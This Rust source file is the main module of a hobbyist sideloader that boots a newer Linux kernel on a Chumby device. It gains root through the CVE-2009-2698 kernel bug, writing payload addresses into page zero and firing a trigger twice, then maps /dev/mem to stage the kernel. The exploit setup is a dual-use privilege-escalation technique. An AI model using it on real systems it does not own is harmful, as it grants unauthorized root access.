//! neochumby-kernel-sideloader: boot a NAND-less Linux 5.9.16 from stock
//! Chumby Linux 2.6.16.
//!
//! This is a bare-metal, statically linked ARM EABI program with a `PT_LOAD`
//! at virtual address 0.  It runs from `/psp/rfs1/rcS` (or a shell/USB
//! stick), uses CVE-2009-2698 to obtain uid 0 and all capabilities, maps
//! `/dev/mem`, stages a 5.9.16 zImage + initramfs outside NAND (a QEMU
//! loader blob at 0xc2000000, or files on a USB stick), and hands off with
//! the MMU off.
//!
//! The CVE trigger and the handoff payloads are a port of the earlier C
//! implementation; `README.md` records the correspondence.
//!
//! `unsafe` is confined to `raw`, which holds the raw system calls, the
//! volatile memory access and the entry ABI.  Everything in this file and
//! the other modules is safe code.

#![no_std]
#![no_main]
#![deny(unsafe_code)]
#![deny(unsafe_op_in_unsafe_fn)]
#![deny(clippy::undocumented_unsafe_blocks)]

mod asm;
mod atags;
mod container;
mod layout;
mod raw;
mod sys;
mod trigger;

use core::panic::PanicInfo;

use atags::build_atags;
use container::load_container;
use layout::{
    ATAGS_PHYS, ATAGS_VA, DEFAULT_CMDLINE, INITRD_DST_PHYS, INITRD_DST_VA, INITRD_MAP_LEN, KERNEL_DST_VA,
    KERNEL_MAP_LEN, PAGE, SRC_MAP_LEN, SRC_PHYS, SRC_VA, STUB_PHYS, STUB_VA,
};
use raw::{Args, CapData, CapHeader};
use sys::{parse_u32, print, print_dec, print_hex, print_str, read_file, str_eq, O_RDWR};
use trigger::trigger;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

pub(crate) fn run(mut args: Args) -> ! {
    let mut source: Option<u32> = Some(SRC_PHYS);
    let mut kernel_file: Option<&[u8]> = None;
    let mut initrd_file: Option<&[u8]> = None;
    let mut cmdline: &[u8] = DEFAULT_CMDLINE;

    while let Some(a) = args.next() {
        if str_eq(a, b"--source") {
            if let Some(v) = args.next() {
                source = parse_u32(v);
            }
        } else if str_eq(a, b"--no-source") {
            source = None;
        } else if str_eq(a, b"--kernel") {
            if let Some(v) = args.next() {
                kernel_file = Some(v);
                source = None;
            }
        } else if str_eq(a, b"--initramfs") {
            if let Some(v) = args.next() {
                initrd_file = Some(v);
            }
        } else if str_eq(a, b"--cmdline") {
            if let Some(v) = args.next() {
                cmdline = v;
            }
        }
    }

    print_str("\nsideloader: NANDLESS: no NAND access in this path\n");
    print_str("sideloader: start uid=");
    let mut uid = raw::getuid();
    let mut gid = raw::getgid();
    print_dec(uid);

    // Run the trigger as an ordinary user, even when rcS started us as root.
    if uid == 0 {
        raw::setgid(1000);
        raw::setuid(1000);
        uid = raw::getuid();
        gid = raw::getgid();
        print_str("sideloader: dropped to uid=");
        print_dec(uid);
    }

    let mut un = [0u8; 390];
    if raw::uname(&mut un) == 0 {
        print_str("sideloader: stock kernel ");
        let start = 130; // release field in struct utsname (65*2)
        let mut n = 0;
        while start + n < 195 && un[start + n] != 0 {
            n += 1;
        }
        print(&un[start..start + n]);
        print(b"\n");
    }

    // First CVE trigger: zero this task's uid/gid and set all capabilities.
    let zero = raw::Mem::page_zero();
    zero.write_u32(0x74, raw::kernel_payload_addr());
    zero.write_u32(0x100, uid);
    zero.write_u32(0x104, gid);
    let r = trigger();
    uid = raw::getuid();
    print_str("sideloader: first trigger r=");
    print_dec(r as u32);
    print_str("sideloader: uid after=");
    print_dec(uid);
    if uid != 0 {
        print_str("sideloader: FAIL: no root\n");
        raw::exit(1);
    }

    let mut ch = CapHeader { version: 0x1998_0330, pid: 0 };
    let mut cd = CapData { effective: 0, permitted: 0, inheritable: 0 };
    let cg = raw::capget(&mut ch, &mut cd);
    print_str("sideloader: capget=");
    print_dec(cg as u32);
    print_str("sideloader: caps eff=");
    print_hex(cd.effective);
    print_str("sideloader: caps permitted=");
    print_hex(cd.permitted);
    print_str("sideloader: caps inheritable=");
    print_hex(cd.inheritable);

    let memfd = raw::open(b"/dev/mem\0", O_RDWR);
    print_str("sideloader: /dev/mem fd=");
    print_dec(memfd as u32);
    if memfd < 0 {
        print_str("sideloader: FAIL: /dev/mem\n");
        raw::exit(1);
    }

    let source_phys = source.unwrap_or(SRC_PHYS);
    let src = match raw::map_phys(memfd as usize, SRC_VA, source_phys, SRC_MAP_LEN) {
        Some(mem) => mem,
        None => {
            print_str("sideloader: FAIL: mmap src\n");
            raw::exit(1);
        }
    };
    let initrd = match raw::map_phys(memfd as usize, INITRD_DST_VA, INITRD_DST_PHYS, INITRD_MAP_LEN) {
        Some(mem) => mem,
        None => {
            print_str("sideloader: FAIL: mmap initrd\n");
            raw::exit(1);
        }
    };
    let atags = match raw::map_phys(memfd as usize, ATAGS_VA, ATAGS_PHYS, PAGE) {
        Some(mem) => mem,
        None => {
            print_str("sideloader: FAIL: mmap atags\n");
            raw::exit(1);
        }
    };
    let stub = match raw::map_phys(memfd as usize, STUB_VA, STUB_PHYS, PAGE) {
        Some(mem) => mem,
        None => {
            print_str("sideloader: FAIL: mmap stub\n");
            raw::exit(1);
        }
    };
    print_str("sideloader: mmap src=");
    print_hex(SRC_VA);
    print_str("sideloader: mmap initrd=");
    print_hex(INITRD_DST_VA);
    print_str("sideloader: mmap atags=");
    print_hex(ATAGS_VA);
    print_str("sideloader: mmap stub=");
    print_hex(STUB_VA);

    let kernel_size;
    let initrd_size;
    if let Some(base) = source {
        match load_container(&src, &initrd) {
            Some((k, r)) => {
                kernel_size = k;
                initrd_size = r;
                print_str("sideloader: source container at ");
                print_hex(base);
            }
            None => {
                print_str("sideloader: FAIL: no NEOCHUM1 container at 0x");
                print_hex(base);
                raw::exit(1);
            }
        }
    } else {
        let kf = match kernel_file {
            Some(p) => p,
            None => {
                print_str("sideloader: FAIL: no --source or --kernel\n");
                raw::exit(1);
            }
        };
        let rf = match initrd_file {
            Some(p) => p,
            None => {
                print_str("sideloader: FAIL: no --initramfs\n");
                raw::exit(1);
            }
        };
        kernel_size = match read_file(kf, &src, KERNEL_MAP_LEN) {
            Some(n) => n,
            None => {
                print_str("sideloader: FAIL: reading kernel file\n");
                raw::exit(1);
            }
        };
        initrd_size = match read_file(rf, &initrd, INITRD_MAP_LEN) {
            Some(n) => n,
            None => {
                print_str("sideloader: FAIL: reading initramfs file\n");
                raw::exit(1);
            }
        };
        print_str("sideloader: kernel file bytes=");
        print_dec(kernel_size);
        print_str("sideloader: initramfs file bytes=");
        print_dec(initrd_size);
    }

    let kmagic = src.read_u32(0x24);
    print_str("sideloader: kernel bytes=");
    print_dec(kernel_size);
    print_str("sideloader: initramfs bytes=");
    print_dec(initrd_size);
    print_str("sideloader: zImage magic=");
    print_hex(kmagic);
    if kmagic != 0x016f_2818 {
        print_str("sideloader: FAIL: zImage magic\n");
        raw::exit(1);
    }

    print_str("sideloader: building ATAGS...\n");
    build_atags(&atags, INITRD_DST_PHYS, initrd_size, cmdline);
    print_str("sideloader: ATAGS done\n");
    let stub_bytes = raw::stub_blob();
    stub.write_bytes(0, stub_bytes);
    print_str("sideloader: stub bytes=");
    print_dec(stub_bytes.len() as u32);

    raw::cacheflush(KERNEL_DST_VA, KERNEL_DST_VA + KERNEL_MAP_LEN);
    if initrd_size != 0 {
        raw::cacheflush(INITRD_DST_VA, INITRD_DST_VA + INITRD_MAP_LEN);
    }
    raw::cacheflush(ATAGS_VA, ATAGS_VA + PAGE);
    raw::cacheflush(STUB_VA, STUB_VA + PAGE);

    // Second trigger: the kernel-mode jump payload at 0x80.
    zero.write_bytes(0x80, raw::jump_blob());
    zero.write_u32(0x74, 0x80);
    raw::cacheflush(0, PAGE);
    print_str("sideloader: second trigger -> ");
    print_hex(STUB_PHYS);

    let _ = trigger();
    print_str("sideloader: FAIL: second trigger returned\n");
    raw::exit(1);
}
